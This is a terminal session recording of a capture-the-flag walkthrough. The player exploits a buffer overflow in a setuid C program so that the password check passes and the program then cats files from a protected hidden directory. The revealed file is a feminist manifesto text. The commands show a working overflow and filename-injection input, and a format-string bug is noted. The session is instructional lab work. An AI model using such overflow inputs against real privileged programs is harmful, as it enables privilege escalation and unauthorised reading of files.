@@ -1,0 +1,253 @@
+Script started on Tue 22 Sep 2015 03:00:58 AM UTC
+[00;31m++++++++++[>+++++++++++>++++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>(( [01;31mBRAINFUCK ME [00;31m ))++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>++++++++++++>+++++>+++++++++++>++++++++++>++++++++++++<<<<<<<<<<<<<<<<<<<-]>--.>---.>--.>+.>------.>-----.>---.>-.>---.>--.>+.>.>+++++.>---.>-----.>----.>.>+.>----.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# now, on to ZERO. ther a[K[K[Ke[Kre are a couple of ways of cracking this one. we'll start with the simplest. first, let's get a look at the rp[K[Kproblem.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mls -l
+total 24
+-rw-r--r-- 1 zero zero   37 Sep 21 17:18 hint
+-rws--s--x 1 zero zero 8885 Sep 21 17:54 [0m[37;41mzero[0m
+-rw-r--r-- 1 zero zero  573 Sep 21 17:54 zero.c
+-rw-r----- 1 bdm  zero  184 Jun  6 00:57 zero.txt
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat hint
+// There's no hint like source code!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat zero.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+
+int main(int argc, char **argv){
+  char filename[0x40] = "zero.txt";
+  char password[7] = //-- snip! --//
+  char buffer[7];
+  char command[0x40] = "cat ";
+  
+  int i=0;
+  printf("ENTER PASSWORD: ");
+  while ((buffer[i++] = getchar()) != '\n')
+    ;
+  buffer[i-1] = '\0';
+  printf("You entered: ");
+  printf(buffer);
+  printf("\n");
+  if (!strncmp(buffer,password,6)){
+    printf("\nOpening %s\n",filename);
+    strcat(command,filename);
+    system(command);
+  } else {
+    printf("\nWRONG PASSWORD\n");
+  }
+}
+
+
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# ah, this is intersting[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K ovese[K[K[K[Kbservations: (1) there is a writeable buffer directly below the password buffer. this means tha [Kt if the write[Kable buffer [K[K[K[K[K[K[K[K[K[K[K[K[Kteable buffer overflows, it will overflow *into* the pas sword buffer. handy. (2) the loop that reads the b[Kpassword, and writes into[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kuser's password and writes into buffer d[Kterminates only when a newline character is entered (i.e. when return is hit). [K[K, not  when a certain n[K# of chars have been entered. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# another ove[K[Kbserve[Kaion[K[K[Ktion: the buffer is printed in a "dnager[K[K[K[K[Kangerous" sort of way. the line print[K[K[K[K[K"p[K[K'printf("[Kbuffer);' is a [K[Kwhat we'd call a format-string vulnerability. more about this  later.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./zero 
+ENTER PASSWORD: foobar
+You entered: foobar
+
+WRONG PASSWORD
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./[Ks[K[Kstrings zero
+strings: zero: Permission denied
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m# well, that woul [Kd be too easy, right?
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mgdb zero
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+zero: No such file or directory.
+(gdb) quit
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# [K[Kls -l
+total 24
+-rw-r--r-- 1 zero zero   37 Sep 21 17:18 hint
+-rws--s--x 1 zero zero 8885 Sep 21 17:54 [0m[37;41mzero[0m
+-rw-r--r-- 1 zero zero  573 Sep 21 17:54 zero.c
+-rw-r----- 1 bdm  zero  184 Jun  6 00:57 zero.txt
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# see, because the zero binary isn't readable, we can't do a strings dump, an objdump, or a gdb session over[K[K[Kn it. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# but we have source code!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# e[Klet[Kt's try [K and[K[K[K[K[K[K[K[Kse[K[K[K [Ks see what happens when e[K[Kwe[K[K[K [Kn we overflow the buffer. remember that it's only 7 bytes long. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./zero[K[K[K[K[K[Kecho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[KAA | foobar
+foobar: command not found
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mecho AAAAAAAAAAAAA | foobar[K[K[K[K[K[K./zero
+ENTER PASSWORD: You entered: AAAAAAAAAAAAA
+
+WRONG PASSWORD
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mecho AAAAAAAAAAAAA | ./zero[C[C[1@A[C[C[1@A[C[C[1@A[C[C[1@A[C[C[1@A[C[C[1@A[C[C[1@A
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAA
+
+WRONG PASSWORD
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mecho AAAAAAAAAAAAAAAAAAAA | ./zero[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A[C[1@A
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Opening A
+cat: A: No such file or directory
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# okay, here's something interesting! by overflowing the buffer, we copied a sequence of As -- [K[K[Kinto both[K[K[K[KBOTH the buffer and the password. [K[K, so that whenthe pass[K[K[K[K[K[K[K[K the password-checking  mechanism h[Kkicked in, j[Kit just made sure that AAAAAAA = [K= AAAAAAA!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# but we went a bit too far, because now the programme is trying to open a files c[K[K[Kc[K called "A" instead of "zero.txt"/ [K[K. let's back up a bit
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# but we went a bit too far, because now the programme is trying to open a file called "A" instead of "zero.txt". let's back up a bit[C[C[C[C[C[Cokay, here's something interesting! by overflowing the buffer, we copied a sequence of As into BOTH the buffer and the password, so that when the password-checking mmechanism kicked in, it just made sure that AAAAAAA == AAAAAAA![A[C[C[C[Cecho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./zero[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Opening 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# what happened here? well, we [K[K[Kremember that strings in C are null-byte-terminated, b[Kwhich means they end with 0[K\0 [K, not with [K[K[K[K[K[K[K[K[K[K[K[K[K\x00, not with the last visible letter. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# we pushed the null byte into the file f[K[Kname field, [K[K
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# we pushed the null byte into the filename field[C[C[C[C[C[C[Chat happened here? well, remember that strings in C are null-byte-terminated, which means they end with \x00, not with the last visible letter. [C[C[C[Cecho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./zero[K[C[C[C[1P
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Opening zero.txt
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+This is not the file you're looking for. 
+Maybe it's hidden somewhere nearby...
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# bingo?...
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# we succeeded in cracking the password checker, but things are never that easy. lets[K's look around a bit more carefully. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# passing the "[K-a flag to ls can help us[K[K[K[K[K[K[K[K[K[K[Kwill list "hidden [K" files and directories, so let's start with that
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mls -a
+[0m[01;34m.[0m  [01;34m..[0m  [01;34m.hidden[0m  hint  [37;41mzero[0m  zero.c  zero.txt
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# well, there we go! let[K[K[K[K
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcd .hidden
+bash: cd: .hidden: Permission denied
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mls /[K.hidden
+ls: cannot open directory .hidden: Permission denied
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m# okay, we'll just have to guess. good chance that [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K it seems at least plasu[K[Kusible that there might be a file called "zero.txt" in .hidden. but we could probably afford to be a bit more r eckless, and just push a wildcare[Kd in tht[Kere. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m# okay, we'll just have to guess. it seems at least plausible that there might be a file called "zero.txt" in .hidden. but we could probably afford to be a bit more reeckless, and just push a wildcard in there. [A[C[C[C[Cls .hidden[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd[C[C[C[C[C[C[C[C[C[C[C[C# well, there we go![C[C[C[Cls -a[K# passing the -a flag to ls will list "hidden" files and directories, so let's start with that[C[C[C[C[C[Cwe succeeded in cracking the password checker, but things are never that easy. let's look around a bit more carefully. [C[C[C[C[C[Cbingo?...[K[C[C[C[Cecho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./zero[C[C[C[C# we pushed the null byte into the filename field[C[C[C[C[4Pecho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./zero[1@.[1@h[1@i[1@d[1@d[1@e[1@n[1@/[1@*[1@'[C[C[1@'
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.hidden/*
+
+Opening hidden/*
+cat: hidden/*: No such file or directory
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.hidden/*' | ./zero[C[1@A
+ENTER PASSWORD: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.hidden/*
+
+Opening .hidden/*
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-               
+                         _______ _ __ ___  
+                        |_  / _ \ '__/ _ \ 
+                         / /  __/ | | (_) |
+                        /___\___|_|  \___/ 
+                   
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+0x00 Abstraction, virtuality and complexity are inextricable from our
+daily lives. XF constructs a feminism adapted to these realities: a
+feminism of unprecedented cunning, scale, and vision; a future in
+which the realization of gender justice and feminist emancipation
+contribute to a universalist politics assembled from the needs of
+every human, regardless of race, ability, economic standing, or
+geographical position. No more futureless repetition on the treadmill
+of capital and state, no more submission to the drudgery of
+reproductive labour. XF is not a bid for revolution, but a wager on
+the long game of history, demanding imagination, dexterity and
+persistence.
+
+
+0x01 XF seizes alienation as an impetus to generate new worlds. We are
+all alienated. Haven’t we always been? It is through, and not despite,
+our alienated condition that we can free ourselves from the muck of
+immediacy. Freedom is not a given—and it’s certainly not given by
+anything ‘natural’. The construction of freedom involves not less but
+more alienation; alienation is the labour of freedom’s construction.
+Nothing should be accepted as fixed, permanent, or ‘given’—neither
+material conditions nor social forms. XF mutates, navigates and probes
+every horizon. Anyone who’s been deemed ‘unnatural’ in the face of
+reigning biological norms, anyone who’s experienced injustices wrought
+in the name of natural order, will realize that the glorification of
+‘nature’ has nothing to offer us—the queer and trans among us, as well
+as those who have suffered discrimination due to pregnancy or duties
+connected to child-rearing, and the differently-abled. XF is
+vehemently anti-naturalist.  Essentialist naturalism stinks of
+theology—the sooner it is exorcised, the better.
+
+
+0x02 Why is there so little explicit, organized effort to repurpose
+technologies for progressive gender political ends? XF strategically
+deploys existing technologies to re-engineer the world. Serious risks
+are built into these tools; they are prone to imbalance, abuse, and
+exploitation of the weak. Rather than pretending to risk nothing, XF
+builds techno-political interfaces commensurate with these
+risks. Technology isn't inherently progressive; its uses are fused
+with culture in a positive feedback loop that makes linear sequencing,
+prediction, and total caution impossible. Technoscientific innovation
+must be linked to a collective theoretical and political thinking in
+which women, queers, and the gender non-conforming play an
+unparalleled role.
+
+ 
+0x03 The real emancipatory potential of technology remains
+unrealized. Fed by the market, its rapid growth is offset by bloat,
+and elegant innovation is surrendered to the buyer, whose stagnant
+world it decorates. Beyond the noisy clutter of commodified cruft, the
+ultimate task lies in engineering technologies to combat unequal
+access to reproductive and pharmacological tools, environmental
+cataclysm, economic instability, as well as dangerous forms of
+unpaid/underpaid labour. Gender inequality still characterizes the
+fields in which our technologies are conceived, built, and legislated
+for, while female workers in electronics (to name just one industry)
+perform some of the worst paid, monotonous and debilitating
+labour. Such injustice demands structural, machinic and ideological
+correction.
+
+
+0x04 Xenofeminism is a rationalism. To claim that reason or
+rationality is "by nature" a patriarchal enterprise is to concede
+defeat. It’s true that the canonical “history of thought” is dominated
+by men, and it is male hands we see throttling existing institutions
+of science and technology. But this is precisely why feminism must be
+a rationalism, because of this miserable imbalance, and not despite
+it. There is no “feminine” rationality, nor is there a “masculine”
+one. Science is not an expression but a suspension of gender. If today
+it is dominated by masculine egos, then it is at odds with itself --
+and this contradiction can be leveraged. Reason, like information,
+wants to be free, and patriarchy cannot give it freedom -- rationalism
+must itself be a feminism. XF marks the intersection of these
+claims. It names reason as an engine of feminist emancipation, and
+asserts the right of everyone to speak as no one in particular.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# booyah
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# note: the reason why ./zero could open hidden, and we couldn't w[K[K, was because it had [K[K[K[Khad the proper privileges, and run[K[Kan with a setd[Kuid bit, which means that even though we 're the ones running it, the process itself is able to do anything its owner could do. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ZERO[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# always check ou[K[Kyour privileges. then escalate them. 
